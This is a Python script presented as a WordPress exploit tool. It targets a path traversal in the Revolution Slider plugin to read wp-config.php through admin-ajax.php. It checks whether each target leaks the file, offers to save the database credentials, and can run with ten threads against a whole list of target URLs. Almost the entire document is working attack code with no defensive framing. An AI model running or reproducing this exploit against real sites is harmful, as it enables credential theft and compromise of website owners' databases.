import requests
import argparse
from urllib.parse import urljoin, quote
import os
from concurrent.futures import ThreadPoolExecutor

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
session = requests.Session()
session.verify = False

reset = "\033[0m"
intense_red = "\033[31;1m"
intense_green = "\033[32;1m"
intense_blue = "\033[34;1m"
intense_yellow = "\033[33;1m"
intense_cyan = "\033[36;1m"
intense_magenta = "\033[35;1m"

def print_banner():
    banner = f"""
{intense_magenta}##########################################{reset}
{intense_magenta}#                                        #{reset}
{intense_magenta}#     Wordpress CVE-2014 Exploit Tool    #{reset}
{intense_magenta}#                                        #{reset}
{intense_magenta}##########################################{reset}
"""
    print(banner)

def user_take():
    parser = argparse.ArgumentParser(description="Wordpress CVE-2014")
    parser.add_argument("-u", "--url", help="Use -u <url> to specify a single target URL")
    parser.add_argument("-f", "--file", help="Use -f to specify a file with multiple URLs")
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.error(f"{intense_red}You must specify either a URL (-u) or a file with URLs (-f).{reset}")
    
    return args.url, args.file

def exploit_func(url, filename=None):
    target_url = url.rstrip("/")
    payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
    full_url = urljoin(target_url, payload)

    res = session.get(target_url)
    try:
        response = session.get(full_url)
        if "MySQL database username" in response.text:
            print(f"{intense_green}[+] Vulnerable! We found config.php at {quote(full_url)}{reset}")
            user = input(f"{intense_yellow}Do you want to download the config file? (y/n): {reset}")

            if user == "y":
                with open(filename, "wb") as file:
                    file.write(response.content)
                if os.path.exists(filename):
                    print(f"{intense_green}[*] Successfully downloaded.{reset}")
                else:
                    print(f"{intense_red}[-] Failed to download.{reset}")
            elif user == "n":
                print(f"{intense_blue}[*] Thanks for using the script.{reset}")
            return True
        else:
            print(f"{intense_red}[-] {url} does not appear to be vulnerable.{reset}")
            return False
    except Exception as e:
        print(f"{intense_red}[-] Error occurred: {e}{reset}")
        return False

def main():
    print_banner()
    filename = "config.php"
    url, file = user_take()

    if url:
        print(f"{intense_blue}[+] Processing the single URL...{reset}")
        exploit_func(url, filename)

    elif file:
        try:
            with open(file, "r") as f:
                urls = f.read().splitlines()

            with ThreadPoolExecutor(max_workers=10) as executor:
                for url in urls:
                    executor.submit(exploit_func, url, filename)

        except FileNotFoundError:
            print(f"{intense_red}[-] File not found: {file}{reset}")
        except Exception as e:
            print(f"{intense_red}[-] Error occurred: {e}{reset}")

if __name__ == "__main__":
    main()
